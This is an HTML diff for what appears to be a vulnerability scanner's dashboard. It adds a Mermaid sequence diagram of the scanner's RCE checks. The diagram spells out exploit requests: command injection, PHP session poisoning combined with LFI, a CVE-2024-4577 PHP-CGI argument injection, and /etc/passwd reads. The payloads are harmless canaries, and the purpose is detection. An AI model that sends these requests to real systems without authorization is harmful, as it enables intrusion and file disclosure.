@@ -16,6 +16,36 @@
   <!-- Phosphor Icons -->
   <script src="https://unpkg.com/@phosphor-icons/web"></script>
 
+  <!-- Mermaid.js for Sequence Diagrams & Condition Logic -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: 'dark',
+      themeVariables: {
+        darkMode: true,
+        background: '#0b1329',
+        mainBkg: '#0f172a',
+        actorBkg: '#1e293b',
+        actorBorder: '#3b82f6',
+        actorTextColor: '#f8fafc',
+        actorLineColor: '#64748b',
+        signalColor: '#38bdf8',
+        signalTextColor: '#e2e8f0',
+        labelBoxBkgColor: '#1e293b',
+        labelBoxBorderColor: '#64748b',
+        labelTextColor: '#f8fafc',
+        loopTextColor: '#fbbf24',
+        noteBorderColor: '#818cf8',
+        noteBkgColor: '#1e1b4b',
+        noteTextColor: '#c7d2fe',
+        activationBorderColor: '#f43f5e',
+        activationBkgColor: '#881337',
+        sequenceNumberColor: '#ffffff'
+      }
+    });
+  </script>
+
   <script>
     tailwind.config = {
       darkMode: 'class',
@@ -466,6 +496,116 @@
           <div class="text-xs text-slate-400 font-medium">4. Forensic Evidence Integrity</div>
           <div class="text-lg font-bold text-emerald-400 mt-1">SHA-256 Digest</div>
           <p class="text-[11px] text-slate-400 mt-1">ปั๊มลายเซ็นดิจิทัลพร้อม Transcript และ Timestamp พร้อมใช้อ้างอิงทางกฎหมาย</p>
+        </div>
+      </div>
+
+      <!-- SEQUENCE DIAGRAM WITH CONDITION LOGIC (HIGH VISIBILITY) -->
+      <div class="glass-card rounded-2xl p-6 glow-border space-y-4">
+        <div class="border-b border-slate-700/60 pb-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-rose-500 animate-pulse"></span>
+              <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                <i class="ph-bold ph-arrows-left-right text-rose-400"></i>
+                ผังลำดับเหตุการณ์และตรรกะเงื่อนไข (Sequence Diagram with Condition Logic)
+              </h3>
+            </div>
+            <p class="text-xs text-slate-400 mt-0.5">
+              แสดงข้อความรับ-ส่งระหว่าง Operator ↔ OPScaner ↔ Web Server ↔ Disk Inode ↔ Runtime Engine พร้อมเงื่อนไขการตัดสินผล (<span class="font-mono text-amber-300">alt</span> / <span class="font-mono text-sky-300">opt</span> / <span class="font-mono text-emerald-300">loop</span>)
+            </p>
+          </div>
+          <span class="code-pill text-[11px] text-rose-400 shrink-0">Mermaid Native Render</span>
+        </div>
+
+        <!-- Mermaid Container with overflow-x-auto -->
+        <div class="overflow-x-auto p-4 rounded-xl bg-slate-950/70 border border-slate-800">
+          <div class="mermaid min-w-[760px]">
+sequenceDiagram
+    autonumber
+    actor User as ผู้ตรวจสอบ (Operator)
+    participant Engine as OPScaner (rce_prover.py)
+    participant TargetWeb as Target Web Server (HTTP)
+    participant Inode as Target Disk (Session Inodes)
+    participant Exec as Runtime Engine (PHP/cmd.exe)
+
+    Note over User,Engine: [เงื่อนไข 0] ตรวจสอบมาตรการความปลอดภัย Safety Gate
+    User->>Engine: เริ่มต้นการสแกนระบบ
+    alt allow_active_rce == False (โหมด Passive มาตรฐาน)
+        Engine-->>User: 🛡️ ระงับทันที: PROBING_DISABLED_BY_SAFETY_GATE (ไม่ส่ง Exploit ใดๆ)
+    else allow_active_rce == True (ได้รับสิทธิ์อนุญาต)
+        Engine->>TargetWeb: GET / (Crawler & Recon ค้นหา Form, Endpoint, Drive C:/D:)
+        TargetWeb-->>Engine: HTML Response (พบพารามิเตอร์: page, file, cmd ฯลฯ)
+
+        opt เงื่อนไข 1: ตรวจพบพารามิเตอร์ส่งคำสั่งระบบ (cmd, exec, shell, ping)
+            Note over Engine,Exec: Flow 1: Direct OS Command Injection Check
+            Engine->>TargetWeb: GET /diagnostic.php?cmd=echo+THAICERT_CMD_74197
+            TargetWeb->>Exec: ส่งคำสั่งเข้า cmd.exe หรือ bash
+            Exec-->>TargetWeb: ส่งข้อความออกทาง Stdout: "THAICERT_CMD_74197"
+            TargetWeb-->>Engine: HTTP 200 (Body: "THAICERT_CMD_74197")
+            alt Response Body มีสตริง "THAICERT_CMD_74197"
+                Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                Engine-->>User: 🔥 RCE_CONFIRMED: ยืนยัน OS Command Injection (CWE-78)
+            end
+        end
+
+        opt เงื่อนไข 2: เป้าหมายรัน PHP (is_php == True)
+            Note over Engine,Exec: Flow 2: PHP2Shell - Session Poisoning with Dynamic Canary
+            Engine->>Engine: สุ่มเลข Dynamic Canary: 54321 + 19876 = 74197
+            Engine->>Engine: ประกอบ Payload: &lt;?php echo 'THAICERT_CANARY_EVAL_'.(54321+19876); exit; ?&gt;
+            
+            Engine->>TargetWeb: POST /login.php (Multipart Form-Data)<br/>Header: PHP_SESSION_UPLOAD_PROGRESS = Canary Payload<br/>Cookie: PHPSESSID=opscaner881234
+            TargetWeb->>Inode: บันทึกไฟล์เซสชันลงดิสก์: sess_opscaner881234
+            TargetWeb-->>Engine: HTTP 200 (Session Inode Created)
+
+            loop วนลูป LFI Parameter (page, file, include) x Inode Paths (Windows C:, D: / Linux /tmp)
+                Engine->>TargetWeb: GET /?page=C:/xampp/tmp/sess_opscaner881234
+                TargetWeb->>Inode: ตรวจสอบและดึงไฟล์เซสชัน
+                alt เคส A: เซิร์ฟเวอร์ใช้ include() / require() ในการโหลดไฟล์
+                    Inode->>Exec: ส่งสตรีมโค้ดเข้า PHP Parser
+                    Exec->>Exec: คำนวณคณิตศาสตร์: 54321 + 19876 = 74197
+                    Exec-->>TargetWeb: คืนค่าผลบวก: "THAICERT_CANARY_EVAL_74197"
+                    TargetWeb-->>Engine: HTTP 200 (Body: "THAICERT_CANARY_EVAL_74197")
+                    Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                    Engine-->>User: 🔥 RCE_CONFIRMED: รันคำนวณคณิตศาสตร์สำเร็จ 100% (CWE-94/98)!
+                else เคส B: เซิร์ฟเวอร์ใช้เพียง readfile() หรือ file_get_contents()
+                    Inode-->>TargetWeb: ข้อความดิบในไฟล์โดยไม่มีการรัน
+                    TargetWeb-->>Engine: HTTP 200 (Body: "&lt;?php echo 'THAICERT_CANARY_EVAL_'...")
+                    Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                    Engine-->>User: ⚠️ CANARY_CONFIRMED: อ่านไฟล์ได้ (LFI สำเร็จ) แต่เซิร์ฟเวอร์ไม่รันโค้ด
+                else เคส C: ไม่พบไฟล์ หรือติด WAF / สิทธิ์การเข้าถึง
+                    TargetWeb-->>Engine: HTTP 404 / 403 (หรือตรงกับ 404 Baseline)
+                    Note over Engine: วนลูปต่อไปยัง Inode Path ถัดไป
+                end
+            end
+        end
+
+        opt เงื่อนไข 3: สถาปัตยกรรมเป็น Windows + PHP (is_windows && is_php)
+            Note over Engine,Exec: Flow 3: PHP-CGI Windows Argument Injection (CVE-2024-4577)
+            Engine->>TargetWeb: POST /index.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input<br/>Body: &lt;?php echo 'THAICERT_CGI_RCE_'.(seed_c+seed_d); exit; ?&gt;
+            TargetWeb->>Exec: PHP-CGI ประมวลผลแทรกคำสั่งจาก php://input
+            Exec-->>TargetWeb: คืนค่าผลบวก: "THAICERT_CGI_RCE_58921"
+            TargetWeb-->>Engine: HTTP 200 (Body: "THAICERT_CGI_RCE_58921")
+            alt Response Body มีสตริงผลบวก CGI RCE
+                Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                Engine-->>User: 🔥 RCE_CONFIRMED: ยืนยัน CVE-2024-4577 บน Windows สำเร็จ!
+            end
+        end
+
+        opt เงื่อนไข 4: Fallback LFI Read อ่านไฟล์ระบบมาตรฐาน
+            Note over Engine,Inode: Flow 4: Fallback LFI Read (/etc/passwd หรือ win.ini)
+            Engine->>TargetWeb: GET /?page=/etc/passwd (หรือ win.ini)
+            TargetWeb->>Inode: อ่านไฟล์ระบบ
+            Inode-->>TargetWeb: เนื้อหาในไฟล์ (root:x:0:0: หรือ [fonts])
+            TargetWeb-->>Engine: HTTP 200 (Body: "root:x:0:0:...")
+            alt ตรวจพบ Signature ไฟล์ระบบ
+                Engine-->>User: ⚠️ CONFIRMED_LFI: ยืนยันการอ่านไฟล์ระบบสำเร็จ (CWE-22)
+            else ไม่พบลายเซ็นใดๆ
+                Engine-->>User: 🛡️ NOT_CONFIRMED: ไม่พบช่องโหว่ RCE หรือ LFI
+            end
+        end
+
+    end
+          </div>
         </div>
       </div>
 
@@ -1245,6 +1385,13 @@
       if (targetBtn) {
         targetBtn.classList.add('bg-blue-600', 'text-white', 'shadow');
         targetBtn.classList.remove('text-slate-400');
+      }
+
+      // Re-render Mermaid diagrams if newly revealed
+      if (window.mermaid) {
+        setTimeout(() => {
+          mermaid.run();
+        }, 50);
       }
     }
   </script>
